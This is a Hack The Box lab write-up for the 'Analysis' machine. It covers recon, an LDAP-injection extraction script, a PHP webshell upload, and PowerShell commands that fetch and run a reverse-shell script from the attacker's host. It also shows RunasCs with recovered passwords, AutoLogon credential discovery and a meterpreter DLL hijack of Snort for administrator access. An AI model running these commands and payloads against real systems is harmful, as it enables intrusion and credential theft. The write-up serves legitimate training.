---
title:  "HTB Analysis Writeup"
date:   2024-06-01 00:30:00 
categories: HTB Machine
tags: LDAP_Injection  Enumeration WinRM dll_hijacking
---

![Analysis](/assets/img/Analysis/GEI9wJrXwAAaI8d.png)

## Introduction 

The path to user was a good reminder that basic enumeration skills are still key.I do have to admit that this box went maybe a litle to far with it.Once you get past this part the LDAP injection is quite refreshing.

The way to root was a lot of fun but quite straight forward when you see it. It was possible to abuse Snort to hijack one of its libraries dll's giving an administrator shell

If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.129.143.102
```
**Nmap**
```
# Nmap 7.94 scan initiated Mon Jan 22 13:25:58 2024 as: nmap -sS -A -p- -o nmap 10.129.143.102
Nmap scan report for 10.129.143.102
Host is up (0.060s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-22 18:26:44Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49685/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94%I=7%D=1/22%Time=65AEB369%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\
SF:0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\0\0
SF:\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0
SF:\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Help,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SSLSessionReq,2B,"\x05\0\0\0\x0b\x08\x
SF:05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05
SF:HY000")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\
SF:x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(Kerberos,9,"\
SF:x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
SF:\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(FourOhFourRequest,9,
SF:"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x
SF:08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(LDAPBindReq,46
SF:,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\x10\x88'\x1a\*Parse
SF:\x20error\x20unserializing\x20protobuf\x20message\"\x05HY000")%r(SIPOpt
SF:ions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NCP
SF:,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05H
SF:Y000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(WMSRequest,9,"\x05
SF:\0\0\0\x0b\x08\x05\x1a\0")%r(oracle-tns,32,"\x05\0\0\0\x0b\x08\x05\x1a\
SF:0%\0\0\0\x01\x08\x01\x10\x88'\x1a\x16Invalid\x20message-frame\.\"\x05HY
SF:000")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\
SF:x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(giop,9,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/22%OT=53%CT=1%CU=42410%PV=Y%DS=2%DC=T%G=Y%TM=65AEB3B
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=I%CI=I%TS=U)SEQ(SP=1
OS:05%GCD=1%ISR=10E%TI=I%CI=I%TS=U)SEQ(SP=105%GCD=1%ISR=10E%TI=I%CI=I%II=I%
OS:SS=S%TS=U)OPS(O1=M542NW8NNS%O2=M542NW8NNS%O3=M542NW8%O4=M542NW8NNS%O5=M5
OS:42NW8NNS%O6=M542NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M542NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
OS:O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-22T18:27:56
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   95.12 ms 10.10.16.1
2   21.08 ms 10.129.143.102

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 22 13:28:02 2024 -- 1 IP address (1 host up) scanned in 124.41 seconds
```

When reviewing the Nmap output we can see that this is a domain controller, all the common domain controller ports are open such as kerberos,ldap,rpc,smb. When trying to enumerate these protocols without authentication i got very little information back only that the domain is **analysis.htb**. Next i decided to check out the webpage however this page would be as static of a webpage as one can be. Literally none of the buttons work


![Analysis main page](/assets/img/Analysis/Analysis_01.png)


#### DNS brute forcing

So seeing this i thought maybe there are some other sites present on the machine. Seeing there is a dns server it makes it an excellent target to perform some subdomain  brute forcing. using the following gobuster command it was possible to find 5 subdomains.


```bash
gobuster dns -d analysis.htb -t 200 -w /home/kali/share/Share/Tools/general/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -r 10.129.232.175:53
```

![Subdomains](/assets/img/Analysis/Analysis_02.png)

#### internal.analysis.htb

Looking at these subdomains **internal.analysis.htb** looks the most interesting of all 5 when browsing to this page though we'd be greeted with forbidden page. This means that the root of this application is not accessible, This does not mean that there are no sub directories we might be able to access.


![Subdomains](/assets/img/Analysis/Analysis_03.png)

So the next step is to try and discover any directories we can access using dirsearch in combination with the **directory-list-lowercase-2.3-small.txt** of seclists. This wordlist isn't the biggest but it can often find the most common directories.
```bash
dirsearch -u http://internal.analysis.htb -w /home/kali/share/Share/Tools/general/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 500 -r -e php -f
```

![Results](/assets/img/Analysis/Analysis_04.png)


 In the output we can see there are 3 directories found namely:
- dashboard
- users
- employees

Then these three dirctories all had some files in them. The dashboard directory contained the following files however i couldn't do anything with these at the moment:

- index.php
- upload directory
- upload.php
- details.php
- form.php
- tickets.php
- logout.php
- dashboard.php

Seeing that none of the files of Dashboard were helping us at this moment i looked at the only file we discovered under the employees directory namely the login.php. This one just showed a login panel so probably if we end up with credentials we'll be able to use them here.

![Login panel](/assets/img/Analysis/Analysis_05.png)

So lastly I checked out the files of the users directory, there was only list.php When browsing to this page we'd be greeted with **missing parameter** error.

![List.php](/assets/img/Analysis/Analysis_06.png)

So thinking on the directory being **users** and the name of the file **list** i started thinking, what could you try to list users by?. Seeing its a domain controller i looked up the most common paramters in active directory and started to try them out. Rather quickly i found out name was a valid parameter and would return the following page.

![Name found](/assets/img/Analysis/Analysis_07.png)

Next i tried supplying a * to the name paramter and we'd actually get some output this is an indicator that wildcards worked.

![Technician found](/assets/img/Analysis/Analysis_08.png)

playing around with the paramter i was able to get a few other users leaked out of here. The fact the wildcard worked made me think this might be an Ldap injection. To test this out i tried to see if we make an and condition with both the name and description. If we made the description empty we would get a negative reply as expected however if we added a * we would get a positive one. This would make it possible to extract the value hidden in the description.

So whenever we supplied a wrong description query we'd get a reply containing **CONTACT_**

![Failed case](/assets/img/Analysis/Analysis_09.png)

When we supply it with a valid query we would get word record for the technician again.

![Positive case](/assets/img/Analysis/Analysis_10.png)

So knowing this it was scripting time. lets script a description bruteforcer using the ldap injection. The following script will automatically extract whatever is in the description.

```python
#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup
import string
import urllib.parse

pwd = ""
proxies = {
   'http': 'http://127.0.0.1:8080',
   'https': 'http://127.0.0.1:8080',
}
charset=string.printable.strip().replace('*','')
pwd=""

while True:

    for char in charset:
        nothingfound=True
        char = char.strip()
        url = "http://internal.analysis.htb/users/list.php"

        payload = {
                'name': 'technician)(%26(objectClass=user)(description='+ pwd + char + '*)'
            }

        payload_str = urllib.parse.urlencode(payload, safe='"#$%&\'*()+,-./:;<=>?@[\]^_`{|}~')
        response = requests.get(url,params=payload_str,proxies=proxies)
        if "technician" in response.text:
            print(char)
            pwd += char
            nothingfound=False
            break

    if nothingfound:
        print("NOTHING FOUND Adding * to the end")
        pwd += "*"
    print("Current password: " + pwd)
```

After running this for a while we could see that the ending * kept being duplicated over and over. This lead me to believe that the string was fully extracted. looking at the randomness of this description i guessed it might have been the password for the login page. If we cut off the trailing * we'd end up with the following string:
![Pass brute](/assets/img/Analysis/Analysis_11.png)

```
97NTtl*4QP96Bv
```

When trying this as the password of the user **technician@analysis.htb** we'd be logged in and greeted with the dashboard.

![Login panel](/assets/img/Analysis/Analysis_12.png)


when looking through the application one feature sticks out like a sore thumb. The SOC report function we were allowed to upload files here.

![SOC report upload](/assets/img/Analysis/Analysis_12.png)



 As initial proof of concept i tried to upload a php file containing the phpinfo command.

```php
<?php

// Show all information, defaults to INFO_ALL
phpinfo();

// Show just the module information.
// phpinfo(8) yields identical results.
phpinfo(INFO_MODULES);

?>
```

The browser would then send the following request.

```
POST /dashboard/upload.php HTTP/1.1
Host: internal.analysis.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------2443440621055325101533182484
Content-Length: 537
Origin: http://internal.analysis.htb
Connection: close
Referer: http://internal.analysis.htb/dashboard/form.php
Cookie: PHPSESSID=hd36pk9u6phc1fl2ud7lbkem0h
Upgrade-Insecure-Requests: 1

-----------------------------2443440621055325101533182484
Content-Disposition: form-data; name="fileToUpload"; filename="Calicoinfo.php"
Content-Type: application/x-php

<?php


// Show all information, defaults to INFO_ALL
phpinfo();

// Show just the module information.
// phpinfo(8) yields identical results.
phpinfo(INFO_MODULES);


?>
-----------------------------2443440621055325101533182484
Content-Disposition: form-data; name="submit"



Upload Sample
-----------------------------2443440621055325101533182484--
```

The server would then return the following valid request. In the response we could see that our file was uploaded to the directory uploads

```
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Location: http://internal.analysis.htb/dashboard/form.php
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.2.5
Date: Tue, 23 Jan 2024 19:51:41 GMT
Connection: close
Content-Length: 22

uploads/Calicoinfo.php
```

Next i browsed to this location on the webserver here we could see it properly rendered our php info page

![SOC report upload](/assets/img/Analysis/Analysis_13.png)


Now seeing we could upload php file, I decided to upload a php webshell.I used the webshell created by [WhiteWinterWolf](https://github.com/WhiteWinterWolf/wwwolf-php-webshell). I uploaded it by doing the exact same steps as the phpinfo page. This page would also upload without any issues and give us a webshell

![Access from svc_web ](/assets/img/Analysis/Analysis_14.png)


## Lateral movement 

### svc_web to webservice
So now we have a webshell as the user **svc_web** but for ease of use i wanted to upgrade this to a full on reverse shell. I hosted a copy of  **Invoke-PowerShellTcp.ps1** script of [nishang](https://github.com/samratashok/nishang) This github repo contains multiple powershell scripts including reverse shells and other post exploitation tools. next i setup a webserver in the shells directory of the github project using python.

```bash
python -m http.server 80
```

So now the preparations for our payload were made. Next issued the following command to launch our reverse shell.

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.40/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.40 -Port 443
```
A moment later we'd receive a reverse shell.

![Reverse shell](/assets/img/Analysis/Analysis_15.png)


While looking around at the files of the web applications files we could see something interesting in the **PS C:\inetpub\internal\users\list.php** file. here we could find some hardcoded credentials that were used to facilitate the ldap querries from the ldap injection we abused earlier. If you want to see the full file please check out the appendix.

```php
<?php

//LDAP Bind paramters, need to be a normal AD User account.
error_reporting(0);
$ldap_password = 'N1G6G46G@G!j';
$ldap_username = 'webservice@analysis.htb';
$ldap_connection = ldap_connect("analysis.htb");
```

So we found credentials for a new users which is great. But seeing we can't log in with these directly we'll need to run these using runas, one issue with this is that runas doesn't work unless its a fully interactive shell. The tool [RunasCS](https://github.com/antonioCoco/RunasCs) though can help us with this as it allows us to execute commands without needing to have a interactive shell.

So first of all we need to do is download our RunasCs.exe binary 

```powershell
wget "http://10.10.16.40/RunasCs.exe" -outfile "RunasCs.exe"
```

Next up we can run a command as webservice using the following command, reverse shell we'll re-use the same one we used before but this time with a different port

```powershell
.\RunasCs.exe webservice N1G6G46G@G!j "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.40/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.40 -Port 444" 
```

Then a moment later we'd be greeted with a reverse shell as **webservice**

![Reverse shell as webservice](/assets/img/Analysis/Analysis_16.png)

### Webservice to jdoe

So now that we have a shell as webservice i decided to run winpeas on this machine. First we needed to download the binary to the machine we can do this with the following command

```powershell
C:\inetpub\internal\dashboard\uploads
wget "http://10.10.16.40/winPEASx64.exe" -outfile "winPEASx64.exe"
```

Next i ran winpeas with as following, the log parameter makes it output to a logfile instead of just the screen: 

```powershell
winPEASx64.exe log
```

When inspecting the output we can see that there are some default auto-logon credentials on this machine for the user jdoe
```
.[1;36m.................................... .[1;32mLooking for AutoLogon credentials.[0m
.[1;31m    Some AutoLogon credentials were found.[0m
    DefaultDomainName             :  analysis.htb.
    DefaultUserName               :  jdoe
    DefaultPassword               :  7y4Z4^*y9Zzj
```

Using this password we were able to log into the machine usign evilwinrm

```powershell
evil-winrm -i analysis.htb -u jdoe -p '7y4Z4^*y9Zzj'
```



## Privesc

After gaining access to the system I noticed that the Snort directory was writeable. This software is known to have a dll hijacking by placing a file called **sf_engine.dll** in the **C:\Snort\lib\snort_dynamicpreprocessor** directory. This program was running as administrator making it interesting to try this attack out.

First we must generate a meterpreter payload using the following msfvenom command

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.16.95 LPORT=4000 -f dll > sf_engine.dll
```

Next setup the meterpreter listener.
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter_reverse_tcp;set LHOST tun0;set LPORT 4000;run;"
```

Next navigate to the **C:\Snort\lib\snort_dynamicpreprocessor** directory and download the dll generated from our webserver.

wget "http://10.10.16.95/sf_engine.dll" -outfile "sf_engine.dll"

Then after a few moment we'd get a callback on our meterpreter reverse shell

![Administrator shell](/assets/img/Analysis/Analysis_17.png)



## Appendix
### Full list.php file
```php
<?php

//LDAP Bind paramters, need to be a normal AD User account.
error_reporting(0);
$ldap_password = 'N1G6G46G@G!j';
$ldap_username = 'webservice@analysis.htb';
$ldap_connection = ldap_connect("analysis.htb");

if(isset($_GET['name'])){
    if (FALSE === $ldap_connection) {
        // Uh-oh, something is wrong...
        echo 'Unable to connect to the ldap server';
    }

// We have to set this option for the version of Active Directory we are using.
    ldap_set_option($ldap_connection, LDAP_OPT_PROTOCOL_VERSION, 3) or die('Unable to set LDAP protocol version');
    ldap_set_option($ldap_connection, LDAP_OPT_REFERRALS, 0); // We need this for doing an LDAP search.

    if (TRUE === ldap_bind($ldap_connection, $ldap_username, $ldap_password)) {

        //Your domains DN to query
        $ldap_base_dn = 'OU=sysadmins,DC=analysis,DC=htb';

        //Get standard users and contacts
        $search_filter = '(&(objectCategory=person)(objectClass=user)(sAMAccountName='.$_GET['name'].'))';


        //Connect to LDAP
        $result = ldap_search($ldap_connection, $ldap_base_dn, $search_filter);

        if (FALSE !== $result) {
            $entries = ldap_get_entries($ldap_connection, $result);

            // Uncomment the below if you want to write all entries to debug somethingthing
            //var_dump($entries);

            //Create a table to display the output
            echo '<h2>Search result</h2></br>';
            echo '<table border = "1"><tr bgcolor="#cccccc"><td>Username</td><td>Last Name</td><td>First Name</td><td>Company</td><td>Department</td><td>Office Phone</td><td>Fax</td><td>Mobile</td><td>DDI</td><td>E-Mail Address</td><td>Home Phone</td></tr>';

            //For each account returned by the search


            //
            //Retrieve values from Active Directory
            //

            //Windows Usernaame
            $LDAP_samaccountname = "";
            $x=0;
            $counter = 1;
            if (!empty($entries[$x]['samaccountname'][0])) {
                $LDAP_samaccountname = $entries[$x]['samaccountname'][0];
                if ($LDAP_samaccountname == "NULL") {
                    $LDAP_samaccountname = "";
                }
                if (strpos($_GET['name'], 'description=') !== false) {
                    $start = strpos($_GET["name"], 'description=');
                    $start += strlen("description=");
                    $end = strrpos($_GET["name"], '*');
                    $password = substr($_GET["name"], $start, $end - $start);
                    $length = strlen($password);
                    for ($i = 0; $i < $length; $i++) {
                        if($entries[$x]['description'][0][$i] != $password[$i]) {
                            $LDAP_uSNCreated = $entries[$x]['usncreated'][0];
                            $LDAP_samaccountname = "CONTACT_";
                            $counter = 0;
                            break;
                        }
                    }
                }
            } else {
                //#There is no samaccountname s0 assume this is an AD contact record so generate a unique username

                $LDAP_uSNCreated = $entries[$x]['usncreated'][0];
                $LDAP_samaccountname = "CONTACT_" . $LDAP_uSNCreated;
            }

            //Last Name
            $LDAP_LastName = "";

            if (!empty($entries[$x]['sn'][0])) {
                $LDAP_LastName = $entries[$x]['sn'][0];
                if ($LDAP_LastName == "NULL") {
                    $LDAP_LastName = "";
                }
            }

            //First Name
            $LDAP_FirstName = "";

            if (!empty($entries[$x]['givenname'][0]) and $counter == 1) {
                $LDAP_FirstName = $entries[$x]['givenname'][0];
                if ($LDAP_FirstName == "NULL") {
                    $LDAP_FirstName = "";
                }
            }

            //Company
            $LDAP_CompanyName = "";

            if (!empty($entries[$x]['company'][0])) {
                $LDAP_CompanyName = $entries[$x]['company'][0];
                if ($LDAP_CompanyName == "NULL") {
                    $LDAP_CompanyName = "";
                }
            }

            //Department
            $LDAP_Department = "";

            if (!empty($entries[$x]['department'][0])) {
                $LDAP_Department = $entries[$x]['department'][0];
                if ($LDAP_Department == "NULL") {
                    $LDAP_Department = "";
                }
            }

            //Job Title
            $LDAP_JobTitle = "";

            if (!empty($entries[$x]['title'][0])) {
                $LDAP_JobTitle = $entries[$x]['title'][0];
                if ($LDAP_JobTitle == "NULL") {
                    $LDAP_JobTitle = "";
                }
            }

            //IPPhone
            $LDAP_OfficePhone = "";

            if (!empty($entries[$x]['ipphone'][0])) {
                $LDAP_OfficePhone = $entries[$x]['ipphone'][0];
                if ($LDAP_OfficePhone == "NULL") {
                    $LDAP_OfficePhone = "";
                }
            }

            //FAX Number
            $LDAP_OfficeFax = "";

            if (!empty($entries[$x]['facsimiletelephonenumber'][0])) {
                $LDAP_OfficeFax = $entries[$x]['facsimiletelephonenumber'][0];
                if ($LDAP_OfficeFax == "NULL") {
                    $LDAP_OfficeFax = "";
                }
            }

            //Mobile Number
            $LDAP_CellPhone = "";

            if (!empty($entries[$x]['mobile'][0])) {
                $LDAP_CellPhone = $entries[$x]['mobile'][0];
                if ($LDAP_CellPhone == "NULL") {
                    $LDAP_CellPhone = "";
                }
            }

            //Telephone Number
            $LDAP_DDI = "";

            if (!empty($entries[$x]['telephonenumber'][0])) {
                $LDAP_DDI = $entries[$x]['telephonenumber'][0];
                if ($LDAP_DDI == "NULL") {
                    $LDAP_DDI = "";
                }
            }

            //Email address
            $LDAP_InternetAddress = "";

            if (!empty($entries[$x]['mail'][0])) {
                $LDAP_InternetAddress = $entries[$x]['mail'][0];
                if ($LDAP_InternetAddress == "NULL") {
                    $LDAP_InternetAddress = "";
                }
            }

            //Home phone
            $LDAP_HomePhone = "";

            if (!empty($entries[$x]['homephone'][0])) {
                $LDAP_HomePhone = $entries[$x]['homephone'][0];
                if ($LDAP_HomePhone == "NULL") {
                    $LDAP_HomePhone = "";
                }
            }

            echo "<tr><td><strong>" . $LDAP_samaccountname . "</strong></td><td>" . $LDAP_LastName . "</td><td>" . $LDAP_FirstName . "</td><td>" . $LDAP_CompanyName . "</td><td>" . $LDAP_Department . "</td><td>" . $LDAP_OfficePhone . "</td><td>" . $LDAP_OfficeFax . "</td><td>" . $LDAP_CellPhone . "</td><td>" . $LDAP_DDI . "</td><td>" . $LDAP_InternetAddress . "</td><td>" . $LDAP_HomePhone . "</td></tr>";

        } //END FALSE !== $result

        ldap_unbind($ldap_connection); // Clean up after ourselves.
        echo ("</table>"); //close the table

    } //END ldap_bind

}
else{

    echo "missing parameter";
}
```